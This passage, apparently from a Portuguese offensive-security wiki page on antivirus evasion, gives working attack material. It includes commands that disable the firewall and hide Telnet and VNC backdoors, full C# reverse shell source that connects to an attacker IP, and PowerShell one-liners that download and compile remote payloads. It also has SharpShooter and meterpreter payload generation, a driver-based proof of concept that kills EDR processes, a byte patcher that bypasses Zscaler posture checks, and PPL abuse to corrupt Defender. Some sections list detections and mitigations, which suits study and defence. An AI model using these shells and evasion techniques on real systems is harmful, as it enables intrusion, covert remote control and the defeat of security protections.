Faça com que ele **inicie** quando o sistema for iniciado e **execute-o** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar porta telnet** (stealth) e desativar o firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads bin, não o instalador)

**ON THE HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Habilite a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém-criado** _**UltraVNC.ini**_ para dentro da **victim**

#### **Reverse connection**

O **attacker** deve executar no seu **host** o binário `vncviewer.exe -listen 5900` para que fique preparado para capturar uma reverse **VNC connection**. Depois, dentro da **victim**: inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVISO:** Para manter a furtividade você não deve fazer algumas coisas

- Não inicie `winvnc` se ele já estiver em execução ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se está em execução com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem o `UltraVNC.ini` no mesmo diretório ou isso fará a [janela de configuração](https://i.imgur.com/rfMQWcf.png) abrir
- Não execute `winvnc -h` para ajuda ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **xml payload** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O Defender atual encerrará o processo muito rapidamente.**

### Compiling our own reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro C# Revershell

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando o compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscadores C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemplo: usando python para build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Matando AV/EDR a partir do espaço do kernel

Storm-2603 aproveitou uma pequena utilidade de console conhecida como **Antivirus Terminator** para desabilitar proteções de endpoint antes de disparar ransomware. A ferramenta traz seu **próprio driver vulnerável mas *assinado*** e o abusa para emitir operações privilegiadas no kernel que até serviços AV em Protected-Process-Light (PPL) não conseguem bloquear.

Principais conclusões
1. **Signed driver**: O arquivo entregue no disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys` do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver possui uma assinatura válida da Microsoft, ele é carregado mesmo quando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **kernel service** e a segunda o inicia para que `\\.\ServiceMouse` se torne acessível a partir do user land.
3. **IOCTLs expostos pelo driver**
| IOCTL code | Capacidade                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Encerra um processo arbitrário por PID (usado para matar serviços Defender/EDR) |
| `0x990000D0` | Exclui um arquivo arbitrário do disco |
| `0x990001D0` | Descarrega o driver e remove o serviço |

Prova de conceito mínima em C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por que funciona**: BYOVD ignora completamente as proteções em user-mode; código que executa no kernel pode abrir processos *protegidos*, terminá-los ou manipular objetos do kernel independentemente de PPL/PP, ELAM ou outras funcionalidades de hardening.

Detecção / Mitigação
•  Habilitar a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows recuse carregar `AToolsKrnl64.sys`.  
•  Monitorar a criação de novos *kernel* services e alertar quando um driver é carregado de um diretório gravável por todos (world-writable) ou não está presente na allow-list.  
•  Observar handles em user-mode para objetos de dispositivo personalizados seguidos por chamadas suspeitas `DeviceIoControl`.

### Contornando as verificações de postura do Zscaler Client Connector via patching de binários no disco

O **Client Connector** da Zscaler aplica regras de postura do dispositivo localmente e depende de Windows RPC para comunicar os resultados a outros componentes. Duas escolhas de design fracas tornam um bypass completo possível:

1. A avaliação de postura acontece **inteiramente no cliente** (um booleano é enviado ao servidor).  
2. Endpoints RPC internos apenas validam que o executável conectante é **assinado pela Zscaler** (via `WinVerifyTrust`).

Ao **patchar quatro binários assinados no disco** ambos os mecanismos podem ser neutralizados:

| Binário | Lógica original alterada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1` para que toda verificação seja considerada compatível |
| `ZSAService.exe` | Chamada indireta para `WinVerifyTrust` | NOP-ed ⇒ qualquer processo (mesmo não assinado) pode conectar-se aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituído por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Checagens de integridade no túnel | Curto-circuitado |

Trecho mínimo do patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Após substituir os arquivos originais e reiniciar a stack de serviços:

* **Todas** as verificações de postura exibem **verde/conforme**.
* Binários não assinados ou modificados conseguem abrir os endpoints RPC de named-pipe (ex.: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido ganha acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente client-side e verificações simples de assinatura podem ser derrotadas com alguns patches de bytes.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) aplica uma hierarquia de signer/level de modo que apenas processos protegidos de nível igual ou superior podem modificar uns aos outros. Em ofensiva, se você conseguir iniciar legitimamente um binário habilitado para PPL e controlar seus argumentos, pode converter funcionalidades benignas (p.ex., logging) em um primitivo de escrita restrito, suportado por PPL, contra diretórios protegidos usados por AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitiva LOLBIN: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` inicia outra instância de si mesmo e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a gravação do arquivo ocorre sob proteção PPL.
- ClipUp não consegue analisar caminhos que contenham espaços; use 8.3 short paths para apontar para locais normalmente protegidos.

8.3 short path helpers
- Liste nomes curtos: `dir /x` em cada diretório pai.
- Obtenha o caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadeia de abuso (abstrata)
1) Inicie o LOLBIN compatível com PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de caminho de log do ClipUp para forçar a criação de um arquivo em um diretório AV protegido (por exemplo, Defender Platform). Use 8.3 short names se necessário.
3) Se o binário alvo normalmente estiver aberto/bloqueado pelo AV enquanto em execução (por exemplo, MsMpEng.exe), agende a escrita na inicialização antes do AV iniciar instalando um serviço de inicialização automática que execute mais cedo de forma confiável. Valide a ordem de boot com Process Monitor (boot logging).
4) No reboot a escrita com suporte PPL ocorre antes do AV bloquear seus binários, corrompendo o arquivo alvo e impedindo a inicialização.

Exemplo de invocação (caminhos omitidos/encurtados por segurança):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas e restrições
- Você não pode controlar o conteúdo que o ClipUp grava além do local; o primitivo é mais adequado para corrupção do que para injeção de conteúdo precisa.
- Requer admin local/SYSTEM para instalar/iniciar um serviço e uma janela de reinicialização.
- O timing é crítico: o alvo não deve estar aberto; a execução na inicialização evita locks de arquivos.

Detecções
- Criação de processo de `ClipUp.exe` com argumentos incomuns, especialmente quando parentado por launchers não padrão, durante a inicialização.
- Novos serviços configurados para auto-start de binários suspeitos que consistentemente iniciam antes do Defender/AV. Investigar criação/modificação de serviços antes de falhas no startup do Defender.
- Monitoramento de integridade de arquivos em binários do Defender/diretórios Platform; criações/modificações inesperadas de arquivos por processos com flags protected-process.
- Telemetria ETW/EDR: procurar por processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de níveis PPL por binários não-AV.

Mitigações
- WDAC/Code Integrity: restringir quais binários assinados podem rodar como PPL e sob quais parents; bloquear invocação do ClipUp fora de contextos legítimos.
- Higiene de serviços: restringir criação/modificação de serviços de auto-start e monitorar manipulação da ordem de inicialização.
- Garantir que Defender tamper protection e proteções de early-launch estejam habilitadas; investigar erros de startup que indiquem corrupção de binários.
- Considerar desabilitar 8.3 short-name generation em volumes que hospedam security tooling, se compatível com seu ambiente (testar exaustivamente).

Referências para PPL e tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
